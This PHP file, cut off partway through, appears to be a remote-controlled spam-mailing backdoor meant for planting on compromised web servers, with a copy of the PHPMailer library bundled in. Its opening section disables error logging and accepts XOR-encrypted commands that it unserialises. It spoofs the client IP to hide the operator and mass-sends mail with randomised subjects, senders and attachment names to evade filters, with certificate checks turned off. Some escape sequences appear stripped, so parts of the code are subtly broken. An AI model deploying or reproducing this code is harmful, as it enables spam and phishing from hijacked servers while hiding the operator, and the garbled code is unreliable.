<?php
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@set_time_limit(0);

if (!empty($_POST))
	{
	$m = new Mailer("43fc0e35-ace4-4169-a131-363db1fd91ea", $_POST);
	echo $m->Send();
	die;
	}

class Preprocessor
	{
	private $text;
	public $uid;

	public function __construct($text, $uid = "")
		{
		$this->text = $text;
		$this->uid = $uid;
		}

	public function Execute()
		{
		preg_match_all('#{%s(.*|.*)s%}#Ui', $this->text, $m);
		for ($i = 0; $i < count($m[1]); $i++)
			{
			$ns = explode("|", $m[1][$i]);
			$this->text = str_replace($m[0][$i], $ns[rand(0, (count($ns) - 1)) ], $this->text);
			}

		preg_match_all('#{%n-([[:digit:]]+)%}#', $this->text, $m);
		for ($i = 0; $i < count($m[0]); $i++)
			{
			$this->text = str_replace($m[0][$i], rand(pow(10, $m[1][$i] - 1) , pow(10, $m[1][$i]) - 1) , $this->text);
			}

		preg_match_all('#{%rn-([[:digit:]]+)-([[:digit:]]+)%}#', $this->text, $m);
		for ($i = 0; $i < count($m[0]); $i++)
			{
			$this->text = str_replace($m[0][$i], rand($m[1][$i], $m[2][$i]) , $this->text);
			}

		if (!empty($this->uid))
			{
			$this->text = str_replace("{{uid}}", $this->uid, $this->text);
			}

		return $this->text;
		}
	}

class Mailer

	{
	private $config;
	private $err;
	private $AuthKey;
	public

	function __construct($AuthKey, $config)
		{
		$this->config = $config;
		$this->AuthKey = $AuthKey;
		}

	private function SendTo($acc, $from, $to, $subject, $body, $type)
		{
		try
			{
			$mail = new PHPMailer(true);
			$mail->IsSMTP();
			$mail->Host = $acc[0];
			$mail->Port = $acc[1];
			if ($acc[1] == 465)
				{
				$mail->SMTPSecure = 'ssl';
				}

			$mail->SMTPAuth = true;
			$mail->Username = $acc[2];
			$mail->Password = $acc[3];
			$mail->SetFrom($acc[4], $from);
			$mail->AddReplyTo($acc[4], $from);
			$mail->AddAddress($to);
			$mail->Subject = $subject;
			$mail->CharSet = 'utf-8';
			$mail->SMTPOptions = array(
				'ssl' => array(
					'verify_peer' => false,
					'verify_peer_name' => false,
					'allow_self_signed' => true
				)
			);
			if ($type == "1")
				{
				$mail->MsgHTML($body);
				}
			elseif ($type == "2")
				{
				$mail->isHTML(false);
				$mail->Body = $body;
				}

			if (isset($_FILES))
				{
				foreach($_FILES as $key => $file)
					{
					if (strpos($file['name'], "{{unchange}}") === false)
						{
						$p = new Preprocessor($file['name']);
						$_FILES[$key]["name"] = $p->Execute();
						}
					  else
						{
						$_FILES[$key]["name"] = str_replace("{{unchange}}", "", $file['name']);
						}
					}

				foreach($_FILES as $key => $file)
					{
					$mail->addAttachment($file['tmp_name'], $file['name']);
					}
				}

			if (!$mail->send())
				{
				$this->err = $mail->ErrorInfo;
				return false;
				}
			  else
				{
				return true;
				}
			}

		catch(Exception $e)
			{
			$this->err = $e->getMessage();
			return false;
			}
		}

	private function XorText($text, $key)
		{
		$outText = '';
		for ($i = 0; $i < strlen($text);)
		for ($j = 0; ($j < strlen($key) && $i < strlen($text)); $j++, $i++) $outText.= $text{$i} ^ $key{$j};
		return $outText;
		}

	public function GetLastError()
		{
		return $this->err;
		}

	public function Send()
		{
				$good = 0;
				$bad = 0;
				try
					{
					if (isset($_SERVER))
						{
						$_SERVER['PHP_SELF'] = "/";
						$_SERVER['REMOTE_ADDR'] = "127.0.0.1";
						if (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
							{
							$_SERVER['HTTP_X_FORWARDED_FOR'] = "127.0.0.1";
							}
						}

					$key = "";
					$data = "";
					$keys = array_keys($this->config);
					sort($keys);
					foreach($keys as $k) $key.= $k;
					$key = $this->XorText($this->AuthKey, $key);
					foreach($keys as $k)
						{
						$data.= $this->config[$k];
						}

					$data = unserialize($this->XorText(base64_decode($data) , $key));
					if (!$data || !isset($data['ak']) || $data['ak'] != $this->AuthKey)
						{
						return false;
						}

					if (isset($data['c']))
						{
						$res["r"]["c"] = $data['c'];
						return serialize($res);
						}

					foreach($data['e'] as $uid => $email)
						{
						$p = new Preprocessor($data['s'][array_rand($data['s']) ]);
						$theme = $p->Execute();
						$p = new Preprocessor($data['l'], $uid);
						$message = $p->Execute();
						$p = new Preprocessor($data['f'][array_rand($data['f']) ]);
						$from = $p->Execute();
						if ($this->SendTo($data["a"], $from, $email, $theme, $message, $data['lt']))
							{
							$good++;
							}
						  else
							{
							$bad++;
							if (!$data["o"]["re"])
								{
								break;
								}
							}
						}
					}

				catch(Exception $e)
					{
					$this->err = $e->getMessage();
					}

				return serialize(array(
					"r" => array(
						"e" => (empty($this->err)) ? 0 : $this->err,
						"g" => $good,
						"b" => $bad
					)
				));
				}
			}

class SMTP

			{
			const VERSION = '5.2.23';
			const CRLF = "rn";
			const DEFAULT_SMTP_PORT = 25;
			const MAX_LINE_LENGTH = 998;
			const DEBUG_OFF = 0;
			const DEBUG_CLIENT = 1;
			const DEBUG_SERVER = 2;
			const DEBUG_CONNECTION = 3;
			const DEBUG_LOWLEVEL = 4;
			public $Version = '5.2.23';

			public $SMTP_PORT = 25;

			public $CRLF = "rn";

			public $do_debug = self::DEBUG_OFF;

			public $Debugoutput = 'echo';

			public $do_verp = false;

			public $Timeout = 300;

			public $Timelimit = 300;

			protected $smtp_transaction_id_patterns = array(
				'exim' => '/[0-9]{3} OK id=(.*)/',
				'sendmail' => '/[0-9]{3} 2.0.0 (.*) Message/',
				'postfix' => '/[0-9]{3} 2.0.0 Ok: queued as (.*)/'
			);
			protected $smtp_conn;
			protected $error = array(
				'error' => '',
				'detail' => '',
				'smtp_code' => '',
				'smtp_code_ex' => ''
			);
			protected $helo_rply = null;
			protected $server_caps = null;
			protected $last_reply = '';
			protected
			function edebug($str, $level = 0)
				{
				if ($level > $this->do_debug)
					{
					return;
					}

				if (!in_array($this->Debugoutput, array(
					'error_log',
					'html',
					'echo'
				)) and is_callable($this->Debugoutput))
					{
					call_user_func($this->Debugoutput, $str, $level);
					return;
					}

				switch ($this->Debugoutput)
					{
				case 'error_log':
					error_log($str);
					break;

				case 'html':
					echo htmlentities(preg_replace('/[rn]+/', '', $str) , ENT_QUOTES, 'UTF-8') . "<br />n";
					break;

				case 'echo':
				default:
					$str = preg_replace('/(rn|r|n)/ms', "n", $str);
					echo gmdate('Y-m-d H:i:s') . "t" . str_replace("n", "n                   t                  ", trim($str)) . "n";
					}
				}

			public

			function connect($host, $port = null, $timeout = 30, $options = array())
				{
				static $streamok;
				if (is_null($streamok))
					{
					$streamok = function_exists('stream_socket_client');
					}

				$this->setError('');
				if ($this->connected())
					{
					$this->setError('Already connected to a server');
					return false;
					}

				if (empty($port))
					{
					$port = self::DEFAULT_SMTP_PORT;
					}

				$this->edebug("Connection: opening to $host:$port, timeout=$timeout, options=" . var_export($options, true) , self::DEBUG_CONNECTION);
				$errno = 0;
				$errstr = '';
				if ($streamok)
					{
					$socket_context = stream_context_create($options);
					set_error_handler(array(
						$this,
						'errorHandler'
					));
					$this->smtp_conn = stream_socket_client($host . ":" . $port, $errno, $errstr, $timeout, STREAM_CLIENT_CONNECT, $socket_context);
					restore_error_handler();
					}
				  else
					{
					$this->edebug("Connection: stream_socket_client not available, falling back to fsockopen", self::DEBUG_CONNECTION);
					set_error_handler(array(
						$this,
						'errorHandler'
					));
					$this->smtp_conn = fsockopen($host, $port, $errno, $errstr, $timeout);
					restore_error_handler();
					}

				if (!is_resource($this->smtp_conn))
					{
					$this->setError('Failed to connect to server', $errno, $errstr);
					$this->edebug('SMTP ERROR: ' . $this->error['error'] . ": $errstr ($errno)", self::DEBUG_CLIENT);
					return false;
					}

				$this->edebug('Connection: opened', self::DEBUG_CONNECTION);
				if (substr(PHP_OS, 0, 3) != 'WIN')
					{
					$max = ini_get('max_execution_time');
					if ($max != 0 && $timeout > $max)
						{
						@set_time_limit($timeout);
						}

					stream_set_timeout($this->smtp_conn, $timeout, 0);
					}

				$announce = $this->get_lines();
				$this->edebug('SERVER -> CLIENT: ' . $announce, self::DEBUG_SERVER);
				return true;
				}

			public

			function startTLS()
				{
				if (!$this->sendCommand('STARTTLS', 'STARTTLS', 220))
					{
					return false;
					}

				$crypto_method = STREAM_CRYPTO_METHOD_TLS_CLIENT;
				if (defined('STREAM_CRYPTO_METHOD_TLSv1_2_CLIENT'))
					{
					$crypto_method|= STREAM_CRYPTO_METHOD_TLSv1_2_CLIENT;
					$crypto_method|= STREAM_CRYPTO_METHOD_TLSv1_1_CLIENT;
					}

				set_error_handler(array(
					$this,
					'errorHandler'
				));
				$crypto_ok = stream_socket_enable_crypto($this->smtp_conn, true, $crypto_method);
				restore_error_handler();
				return $crypto_ok;
				}

			public

			function authenticate($username, $password, $authtype = null, $realm = '', $workstation = '', $OAuth = null)
				{
				if (!$this->server_caps)
					{
					$this->setError('Authentication is not allowed before HELO/EHLO');
					return false;
					}

				if (array_key_exists('EHLO', $this->server_caps))
					{
					if (!array_key_exists('AUTH', $this->server_caps))
						{
						$this->setError('Authentication is not allowed at this stage');
						return false;
						}

					self::edebug('Auth method requested: ' . ($authtype ? $authtype : 'UNKNOWN') , self::DEBUG_LOWLEVEL);
					self::edebug('Auth methods available on the server: ' . implode(',', $this->server_caps['AUTH']) , self::DEBUG_LOWLEVEL);
					if (empty($authtype))
						{
						foreach(array(
							'CRAM-MD5',
							'LOGIN',
							'PLAIN',
							'NTLM',
							'XOAUTH2'
						) as $method)
							{
							if (in_array($method, $this->server_caps['AUTH']))
								{
								$authtype = $method;
								break;
								}
							}

						if (empty($authtype))
							{
							$this->setError('No supported authentication methods found');
							return false;
							}

						self::edebug('Auth method selected: ' . $authtype, self::DEBUG_LOWLEVEL);
						}

					if (!in_array($authtype, $this->server_caps['AUTH']))
						{
						$this->setError("The requested authentication method "$authtype" is not supported by the server");
						return false;
						}
					}
				elseif (empty($authtype))
					{
					$authtype = 'LOGIN';
					}

				switch ($authtype)
					{
				case 'PLAIN':
					if (!$this->sendCommand('AUTH', 'AUTH PLAIN', 334))
						{
						return false;
						}

					if (!$this->sendCommand('User & Password', base64_encode("" . $username . "" . $password) , 235))
						{
						return false;
						}

					break;

				case 'LOGIN':
					if (!$this->sendCommand('AUTH', 'AUTH LOGIN', 334))
						{
						return false;
						}

					if (!$this->sendCommand("Username", base64_encode($username) , 334))
						{
						return false;
						}

					if (!$this->sendCommand("Password", base64_encode($password) , 235))
						{
						return false;
						}

					break;

				case 'XOAUTH2':
					if (is_null($OAuth))
						{
						return false;
						}

					$oauth = $OAuth->getOauth64();
					if (!$this->sendCommand('AUTH', 'AUTH XOAUTH2 ' . $oauth, 235))
						{
						return false;
						}

					break;

				case 'NTLM':
					$temp = new stdClass;
					$ntlm_client = new ntlm_sasl_client_class;
					if (!$ntlm_client->initialize($temp))
						{
						$this->setError($temp->error);
						$this->edebug('You need to enable some modules in your php.ini file: ' . $this->error['error'], self::DEBUG_CLIENT);
						return false;
						}

					$msg1 = $ntlm_client->typeMsg1($realm, $workstation);
					if (!$this->sendCommand('AUTH NTLM', 'AUTH NTLM ' . base64_encode($msg1) , 334))
						{
						return false;
						}

					$challenge = substr($this->last_reply, 3);
					$challenge = base64_decode($challenge);
					$ntlm_res = $ntlm_client->NTLMResponse(substr($challenge, 24, 8) , $password);
					$msg3 = $ntlm_client->typeMsg3($ntlm_res, $username, $realm, $workstation);
					return $this->sendCommand('Username', base64_encode($msg3) , 235);
				case 'CRAM-MD5':
					if (!$this->sendCommand('AUTH CRAM-MD5', 'AUTH CRAM-MD5', 334))
						{
						return false;
						}

					$challenge = base64_decode(substr($this->last_reply, 4));
					$response = $username . ' ' . $this->hmac($challenge, $password);
					return $this->sendCommand('Username', base64_encode($response) , 235);
				default:
					$this->setError("Authentication method "$authtype" is not supported");
					return false;
					}

				return true;
				}

			protected
			function hmac($data, $key)
				{
				if (function_exists('hash_hmac'))
					{
					return hash_hmac('md5', $data, $key);
					}

				$bytelen = 64;
				if (strlen($key) > $bytelen)
					{
					$key = pack('H*', md5($key));
					}

				$key = str_pad($key, $bytelen, chr(0x00));
				$ipad = str_pad('', $bytelen, chr(0x36));
				$opad = str_pad('', $bytelen, chr(0x5c));
				$k_ipad = $key ^ $ipad;
				$k_opad = $key ^ $opad;
				return md5($k_opad . pack('H*', md5($k_ipad . $data)));
				}

			public

			function connected()
				{
				if (is_resource($this->smtp_conn))
					{
					$sock_status = stream_get_meta_data($this->smtp_conn);
					if ($sock_status['eof'])
						{
						$this->edebug('SMTP NOTICE: EOF caught while checking if connected', self::DEBUG_CLIENT);
						$this->close();
						return false;
						}

					return true;
					}

				return false;
				}

			public

			function close()
				{
				$this->setError('');
				$this->server_caps = null;
				$this->helo_rply = null;
				if (is_resource($this->smtp_conn))
					{
					fclose($this->smtp_conn);
					$this->smtp_conn = null;
					$this->edebug('Connection: closed', self::DEBUG_CONNECTION);
					}
				}

			public

			function data($msg_data)
				{
				if (!$this->sendCommand('DATA', 'DATA', 354))
					{
					return false;
					}

				$lines = explode("n", str_replace(array(
					"rn",
					"r"
				) , "n", $msg_data));
				$field = substr($lines[0], 0, strpos($lines[0], ':'));
				$in_headers = false;
				if (!empty($field) && strpos($field, ' ') === false)
					{
					$in_headers = true;
					}

				foreach($lines as $line)
					{
					$lines_out = array();
					if ($in_headers and $line == '')
						{
						$in_headers = false;
						}

					while (isset($line[self::MAX_LINE_LENGTH]))
						{
						$pos = strrpos(substr($line, 0, self::MAX_LINE_LENGTH) , ' ');
						if (!$pos)
							{
							$pos = self::MAX_LINE_LENGTH - 1;
							$lines_out[] = substr($line, 0, $pos);
							$line = substr($line, $pos);
							}
						  else
							{
							$lines_out[] = substr($line, 0, $pos);
							$line = substr($line, $pos + 1);
							}

						if ($in_headers)
							{
							$line = "t" . $line;
							}
						}

					$lines_out[] = $line;
					foreach($lines_out as $line_out)
						{
						if (!empty($line_out) and $line_out[0] == '.')
							{
							$line_out = '.' . $line_out;
							}

						$this->client_send($line_out . self::CRLF);
						}
					}

				$savetimelimit = $this->Timelimit;
				$this->Timelimit = $this->Timelimit * 2;
				$result = $this->sendCommand('DATA END', '.', 250);
				$this->Timelimit = $savetimelimit;
				return $result;
				}

			public

			function hello($host = '')
				{
				return (boolean)($this->sendHello('EHLO', $host) or $this->sendHello('HELO', $host));
				}

			protected
			function sendHello($hello, $host)
				{
				$noerror = $this->sendCommand($hello, $hello . ' ' . $host, 250);
				$this->helo_rply = $this->last_reply;
				if ($noerror)
					{
					$this->parseHelloFields($hello);
					}
				  else
					{
					$this->server_caps = null;
					}

				return $noerror;
				}

			protected
			function parseHelloFields($type)
				{
				$this->server_caps = array();
				$lines = explode("n", $this->helo_rply);
				foreach($lines as $n => $s)
					{
					$s = trim(substr($s, 4));
					if (empty($s))
						{
						continue;
						}

					$fields = explode(' ', $s);
					if (!empty($fields))
						{
						if (!$n)
							{
							$name = $type;
							$fields = $fields[0];
							}
						  else
							{
							$name = array_shift($fields);
							switch ($name)
								{
							case 'SIZE':
								$fields = ($fields ? $fields[0] : 0);
								break;

							case 'AUTH':
								if (!is_array($fields))
									{
									$fields = array();
									}

								break;

							default:
								$fields = true;
								}
							}

						$this->server_caps[$name] = $fields;
						}
					}
				}

			public

			function mail($from)
				{
				$useVerp = ($this->do_verp ? ' XVERP' : '');
				return $this->sendCommand('MAIL FROM', 'MAIL FROM:<' . $from . '>' . $useVerp, 250);
				}

			public

			function quit($close_on_error = true)
				{
				$noerror = $this->sendCommand('QUIT', 'QUIT', 221);
				$err = $this->error;
				if ($noerror or $close_on_error)
					{
					$this->close();
					$this->error = $err;
					}

				return $noerror;
				}

			public

			function recipient($address)
				{
				return $this->sendCommand('RCPT TO', 'RCPT TO:<' . $address . '>', array(
					250,
					251
				));
				}

			public

			function reset()
				{
				return $this->sendCommand('RSET', 'RSET', 250);
				}

			protected
			function sendCommand($command, $commandstring, $expect)
				{
				if (!$this->connected())
					{
					$this->setError("Called $command without being connected");
					return false;
					}

				if (strpos($commandstring, "n") !== false or strpos($commandstring, "r") !== false)
					{
					$this->setError("Command '$command' contained line breaks");
					return false;
					}

				$this->client_send($commandstring . self::CRLF);
				$this->last_reply = $this->get_lines();
				$matches = array();
				if (preg_match("/^([0-9]{3})[ -](?:([0-9]\.[0-9]\.[0-9]) )?/", $this->last_reply, $matches))
					{
					$code = $matches[1];
					$code_ex = (count($matches) > 2 ? $matches[2] : null);
					$detail = preg_replace("/{$code}[ -]" . ($code_ex ? str_replace('.', '\.', $code_ex) . ' ' : '') . "/m", '', $this->last_reply);
					}
				  else
					{
					$code = substr($this->last_reply, 0, 3);
					$code_ex = null;
					$detail = substr($this->last_reply, 4);
					}

				$this->edebug('SERVER -> CLIENT: ' . $this->last_reply, self::DEBUG_SERVER);
				if (!in_array($code, (array)$expect))
					{
					$this->setError("$command command failed", $detail, $code, $code_ex);
					$this->edebug('SMTP ERROR: ' . $this->error['error'] . ': ' . $this->last_reply, self::DEBUG_CLIENT);
					return false;
					}

				$this->setError('');
				return true;
				}

			public

			function sendAndMail($from)
				{
				return $this->sendCommand('SAML', "SAML FROM:$from", 250);
				}

			public

			function verify($name)
				{
				return $this->sendCommand('VRFY', "VRFY $name", array(
					250,
					251
				));
				}

			public

			function noop()
				{
				return $this->sendCommand('NOOP', 'NOOP', 250);
				}

			public

			function turn()
				{
				$this->setError('The SMTP TURN command is not implemented');
				$this->edebug('SMTP NOTICE: ' . $this->error['error'], self::DEBUG_CLIENT);
				return false;
				}

			public

			function client_send($data)
				{
				$this->edebug("CLIENT -> SERVER: $data", self::DEBUG_CLIENT);
				set_error_handler(array(
					$this,
					'errorHandler'
				));
				$result = fwrite($this->smtp_conn, $data);
				restore_error_handler();
				return $result;
				}

			public

			function getError()
				{
				return $this->error;
				}

			public

			function getServerExtList()
				{
				return $this->server_caps;
				}

			public

			function getServerExt($name)
				{
				if (!$this->server_caps)
					{
					$this->setError('No HELO/EHLO was sent');
					return null;
					}

				if (!array_key_exists($name, $this->server_caps))
					{
					if ($name == 'HELO')
						{
						return $this->server_caps['EHLO'];
						}

					if ($name == 'EHLO' || array_key_exists('EHLO', $this->server_caps))
						{
						return false;
						}

					$this->setError('HELO handshake was used. Client knows nothing about server extensions');
					return null;
					}

				return $this->server_caps[$name];
				}

			public

			function getLastReply()
				{
				return $this->last_reply;
				}

			protected
			function get_lines()
				{
				if (!is_resource($this->smtp_conn))
					{
					return '';
					}

				$data = '';
				$endtime = 0;
				stream_set_timeout($this->smtp_conn, $this->Timeout);
				if ($this->Timelimit > 0)
					{
					$endtime = time() + $this->Timelimit;
					}

				while (is_resource($this->smtp_conn) && !feof($this->smtp_conn))
					{
					$str = @fgets($this->smtp_conn, 515);
					$this->edebug("SMTP -> get_lines(): $data is "$data"", self::DEBUG_LOWLEVEL);
					$this->edebug("SMTP -> get_lines(): $str is  "$str"", self::DEBUG_LOWLEVEL);
					$data.= $str;
					if (!isset($str[3]) or (isset($str[3]) and $str[3] == ' '))
						{
						break;
						}

					$info = stream_get_meta_data($this->smtp_conn);
					if ($info['timed_out'])
						{
						$this->edebug('SMTP -> get_lines(): timed-out (' . $this->Timeout . ' sec)', self::DEBUG_LOWLEVEL);
						break;
						}

					if ($endtime and time() > $endtime)
						{
						$this->edebug('SMTP -> get_lines(): timelimit reached (' . $this->Timelimit . ' sec)', self::DEBUG_LOWLEVEL);
						break;
						}
					}

				return $data;
				}

			public

			function setVerp($enabled = false)
				{
				$this->do_verp = $enabled;
				}

			public

			function getVerp()
				{
				return $this->do_verp;
				}

			protected
			function setError($message, $detail = '', $smtp_code = '', $smtp_code_ex = '')
				{
				$this->error = array(
					'error' => $message,
					'detail' => $detail,
					'smtp_code' => $smtp_code,
					'smtp_code_ex' => $smtp_code_ex
				);
				}

			public

			function setDebugOutput($method = 'echo')
				{
				$this->Debugoutput = $method;
				}

			public

			function getDebugOutput()
				{
				return $this->Debugoutput;
				}

			public

			function setDebugLevel($level = 0)
				{
				$this->do_debug = $level;
				}

			public

			function getDebugLevel()
				{
				return $this->do_debug;
				}

			public

			function setTimeout($timeout = 0)
				{
				$this->Timeout = $timeout;
				}

			public

			function getTimeout()
				{
				return $this->Timeout;
				}

			protected
			function errorHandler($errno, $errmsg, $errfile = '', $errline = 0)
				{
				$notice = 'Connection failed.';
				$this->setError($notice, $errno, $errmsg);
				$this->edebug($notice . ' Error #' . $errno . ': ' . $errmsg . " [$errfile line $errline]", self::DEBUG_CONNECTION);
				}

			public

			function getLastTransactionID()
				{
				$reply = $this->getLastReply();
				if (empty($reply))
					{
					return null;
					}

				foreach($this->smtp_transaction_id_patterns as $smtp_transaction_id_pattern)
					{
					if (preg_match($smtp_transaction_id_pattern, $reply, $matches))
						{
						return $matches[1];
						}
					}

				return false;
				}
			}

		class PHPMailer

			{
			public $Version = '5.2.23';

			public $Priority = null;

			public $CharSet = 'iso-8859-1';

			public $ContentType = 'text/plain';

			public $Encoding = '8bit';

			public $ErrorInfo = '';

			public $From = 'root@localhost';

			public $FromName = 'Root User';

			public $Sender = '';

			public $ReturnPath = '';

			public $Subject = '';

			public $Body = '';

			public $AltBody = '';

			public $Ical = '';

			protected $MIMEBody = '';
			protected $MIMEHeader = '';
			protected $mailHeader = '';
			public $WordWrap = 0;

			public $Mailer = 'mail';

			public $Sendmail = '/usr/sbin/sendmail';

			public $UseSendmailOptions = true;

			public $PluginDir = '';

			public $ConfirmReadingTo = '';

			public $Hostname = '';

			public $MessageID = '';

			public $MessageDate = '';

			public $Host = 'localhost';

			public $Port = 25;

			public $Helo = '';

			public $SMTPSecure = '';

			public $SMTPAutoTLS = true;

			public $SMTPAuth = false;

			public $SMTPOptions = array(
);
			public $Username = '';

			public $Password = '';

			public $AuthType = '';

			public $Realm = '';

			public $Workstation = '';

			public $Timeout = 300;

			public $SMTPDebug = 0;

			public $Debugoutput = 'echo';

			public $SMTPKeepAlive = false;

			public $SingleTo = false;

			public $SingleToArray = array(
);
			public $do_verp = false;

			public $AllowEmpty = false;

			public $LE = "n";

			public $action_function = '';

			public $XMailer = '';

			public static $validator = 'auto';

			protected $smtp = null;
			protected $to = array();
			protected $cc = array();
			protected $bcc = array();
			protected $ReplyTo = array();
			protected $all_recipients = array();
			protected $RecipientsQueue = array();
			protected $ReplyToQueue = array();
			protected $attachment = array();
			protected $CustomHeader = array();
			protected $lastMessageID = '';
			protected $message_type = '';
			protected $boundary = array();
			protected $language = array();
			protected $error_count = 0;
			protected $sign_cert_file = '';
			protected $sign_key_file = '';
			protected $sign_extracerts_file = '';
			protected $sign_key_pass = '';
			protected $exceptions = false;
			protected $uniqueid = '';
			const STOP_MESSAGE = 0;
			const STOP_CONTINUE = 1;
			const STOP_CRITICAL = 2;
			const CRLF = "rn";
			const MAX_LINE_LENGTH = 998;
			public

			function __construct($exceptions = null)
				{
				if ($exceptions !== null)
					{
					$this->exceptions = (boolean)$exceptions;
					}
				}

			public

			function __destruct()
				{
				$this->smtpClose();
				}

			private
			function mailPassthru($to, $subject, $body, $header, $params)
				{
				if (ini_get('mbstring.func_overload') & 1)
					{
					$subject = $this->secureHeader($subject);
					}
				  else
					{
					$subject = $this->encodeHeader($this->secureHeader($subject));
					}

				if (ini_get('safe_mode') or !$this->UseSendmailOptions or is_null($params))
					{
					$result = @mail($to, $subject, $body, $header);
					}
				  else
					{
					$result = @mail($to, $subject, $body, $header, $params);
					}

				return $result;
				}

			protected
			function edebug($str)
				{
				if ($this->SMTPDebug <= 0)
					{
					return;
					}

				if (!in_array($this->Debugoutput, array(
					'error_log',
					'html',
					'echo'
				)) and is_callable($this->Debugoutput))
					{
					call_user_func($this->Debugoutput, $str, $this->SMTPDebug);
					return;
					}

				switch ($this->Debugoutput)
					{
				case 'error_log':
					error_log($str);
					break;

				case 'html':
					echo htmlentities(preg_replace('/[rn]+/', '', $str) , ENT_QUOTES, 'UTF-8') . "<br />n";
					break;

				case 'echo':
				default:
					$str = preg_replace('/rn?/ms', "n", $str);
					echo gmdate('Y-m-d H:i:s') . "t" . str_replace("n", "n                   t                  ", trim($str)) . "n";
					}
				}

			public

			function isHTML($isHtml = true)
				{
				if ($isHtml)
					{
					$this->ContentType = 'text/html';
					}
				  else
					{
					$this->ContentType = 'text/plain';
					}
				}

			public

			function isSMTP()
				{
				$this->Mailer = 'smtp';
				}

			public

			function isMail()
				{
				$this->Mailer = 'mail';
				}

			public

			function addAddress($address, $name = '')
				{
				return $this->addOrEnqueueAnAddress('to', $address, $name);
				}

			public

			function addReplyTo($address, $name = '')
				{
				return $this->addOrEnqueueAnAddress('Reply-To', $address, $name);
				}

			protected
			function addOrEnqueueAnAddress($kind, $address, $name)
				{
				$address = trim($address);
				$name = trim(preg_replace('/[rn]+/', '', $name));
				if (($pos = strrpos($address, '@')) === false)
					{
					$error_message = ('invalid_address') . " (addAnAddress $kind): $address";
					$this->setError($error_message);
					$this->edebug($error_message);
					if ($this->exceptions)
						{
						throw new phpmailerException($error_message);
						}

					return false;
					}

				$params = array(
					$kind,
					$address,
					$name
				);
				if ($this->has8bitChars(substr($address, ++$pos)) and $this->idnSupported())
					{
					if ($kind != 'Reply-To')
						{
						if (!array_key_exists($address, $this->RecipientsQueue))
							{
							$this->RecipientsQueue[$address] = $params;
							return true;
							}
						}
					  else
						{
						if (!array_key_exists($address, $this->ReplyToQueue))
							{
							$this->ReplyToQueue[$address] = $params;
							return true;
							}
						}

					return false;
					}

				return call_user_func_array(array(
					$this,
					'addAnAddress'
				) , $params);
				}

			protected
			function addAnAddress($kind, $address, $name = '')
				{
				if (!in_array($kind, array(
					'to',
					'cc',
					'bcc',
					'Reply-To'
				)))
					{
					$error_message = ('Invalid recipient kind: ') . $kind;
					$this->setError($error_message);
					$this->edebug($error_message);
					if ($this->exceptions)
						{
						throw new phpmailerException($error_message);
						}

					return false;
					}

				if (!$this->validateAddress($address))
					{
					$error_message = ('invalid_address') . " (addAnAddress $kind): $address";
					$this->setError($error_message);
					$this->edebug($error_message);
					if ($this->exceptions)
						{
						throw new phpmailerException($error_message);
						}

					return false;
					}

				if ($kind != 'Reply-To')
					{
					if (!array_key_exists(strtolower($address) , $this->all_recipients))
						{
						array_push($this->$kind, array(
							$address,
							$name
						));
						$this->all_recipients[strtolower($address) ] = true;
						return true;
						}
					}
				  else
					{
					if (!array_key_exists(strtolower($address) , $this->ReplyTo))
						{
						$this->ReplyTo[strtolower($address) ] = array(
							$address,
							$name
						);
						return true;
						}
					}

				return false;
				}

			public

			function setFrom($address, $name = '', $auto = true)
				{
				$address = trim($address);
				$name = trim(preg_replace('/[rn]+/', '', $name));
				if (($pos = strrpos($address, '@')) === false or (!$this->has8bitChars(substr($address, ++$pos)) or !$this->idnSupported()) and !$this->validateAddress($address))
					{
					$error_message = ('invalid_address') . " (setFrom) $address";
					$this->setError($error_message);
					$this->edebug($error_message);
					if ($this->exceptions)
						{
						throw new phpmailerException($error_message);
						}

					return false;
					}

				$this->From = $address;
				$this->FromName = $name;
				if ($auto)
					{
					if (empty($this->Sender))
						{
						$this->Sender = $address;
						}
					}

				return true;
				}

			protected
			function setError($msg)
				{
				$this->error_count++;
				if ($this->Mailer == 'smtp' and !is_null($this->smtp))
					{
					$lasterror = $this->smtp->getError();
					if (!empty($lasterror['error']))
						{
						$msg.= 'smtp_error' . $lasterror['error'];
						if (!empty($lasterror['detail']))
							{
							$msg.= ' Detail: ' . $lasterror['detail'];
							}

						if (!empty($lasterror['smtp_code']))
							{
							$msg.= ' SMTP code: ' . $lasterror['smtp_code'];
							}

						if (!empty($lasterror['smtp_code_ex']))
							{
							$msg.= ' Additional SMTP info: ' . $lasterror['smtp_code_ex'];
							}
						}
					}

				$this->ErrorInfo = $msg;
				}

			public static

			function validateAddress($address, $patternselect = null)
				{
				if (is_null($patternselect))
					{
					$patternselect = self::$validator;
					}

				if (is_callable($patternselect))
					{
					return call_user_func($patternselect, $address);
					}

				if (strpos($address, "n") !== false or strpos($address, "r") !== false)
					{
					return false;
					}

				if (!$patternselect or $patternselect == 'auto')
					{
					if (defined('PCRE_VERSION'))
						{
						if (version_compare(PCRE_VERSION, '8.0.3') >= 0)
							{
							$patternselect = 'pcre8';
							}
						  else
							{
							$patternselect = 'pcre';
							}
						}
					elseif (function_exists('extension_loaded') and extension_loaded('pcre'))
						{
						$patternselect = 'pcre';
						}
					  else
						{
						if (version_compare(PHP_VERSION, '5.2.0') >= 0)
							{
							$patternselect = 'php';
							}
						  else
							{
							$patternselect = 'noregex';
							}
						}
					}

				switch ($patternselect)
					{
